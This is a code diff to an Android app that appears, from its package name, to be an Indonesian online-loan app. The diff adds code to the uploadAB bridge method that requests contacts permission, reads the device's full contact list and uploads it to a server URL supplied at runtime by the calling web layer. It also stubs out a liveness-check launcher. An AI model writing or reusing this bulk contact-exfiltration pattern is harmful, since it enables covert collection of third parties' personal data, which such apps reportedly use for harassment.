@@ -32,6 +32,7 @@ import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.fire
 import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.interfice.HostSwitchInterfice;
 import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.interfice.OkResultCallback;
 import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.net.OKHttpUtil;
+import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.ContactsUtil;
 import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.GetSystemAppInfoList;
 import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.GpsLocationUtils;
 import com.tbruyelle.rxpermissions2.RxPermissions;
@@ -251,8 +252,11 @@ public class MainActivity extends BaseActivity implements HostSwitchInterfice {
 //        if (isAllGranted) {
 //            startLivenessActivity();
 //        } else {
-//            mHostSwitchHandle.uploadData(mCallback, new Gson().toJson(isSuccess));
+//
+//           mHostSwitchHandle.uploadData(mCallback, new Gson().toJson(isSuccess));
 //        }
+
+        startCheckActivity();
     }
 
     @Override
@@ -406,9 +410,31 @@ public class MainActivity extends BaseActivity implements HostSwitchInterfice {
                 });
     }
 
+    @SuppressLint("CheckResult")
     @Override
     public void uploadAB(String data, String callback) {
+        new RxPermissions(this)
+                .request(readContacts)
+                .subscribe(granted -> {
+                    if (granted) {
+                        JSONObject contactsObject = new JSONObject();
+                        JSONArray contactsArrAy = ContactsUtil.getContactsAll(MyApplication.context);
+                        contactsObject.put("contacts", contactsArrAy);
+                        OKHttpUtil.uploadText(data, contactsObject.toString(), new OkResultCallback() {
+                            @Override
+                            public void onSuccess(Call call, Response response) {
+                                uploadUrl(callback, ParameterUtil.getIsSuccessJson(true));
+                            }
 
+                            @Override
+                            public void onFailed(Call call, IOException e) {
+                                uploadUrl(callback, ParameterUtil.getIsSuccessJson(false));
+                            }
+                        }, this);
+                    } else {
+                        uploadUrl(callback, ParameterUtil.getIsSuccessJson(false));
+                    }
+                });
     }
 
     /**
@@ -488,6 +514,14 @@ public class MainActivity extends BaseActivity implements HostSwitchInterfice {
             return true;
         }
         return false;
+    }
+
+    /**
+     * 启动活体检测
+     */
+    private void startCheckActivity() {
+//        Intent intent = new Intent(this, LivenessActivity.class);
+//        startActivityForResult(intent,Constants.REQUEST_CODE_LIVENESS);
     }
 
     @Override
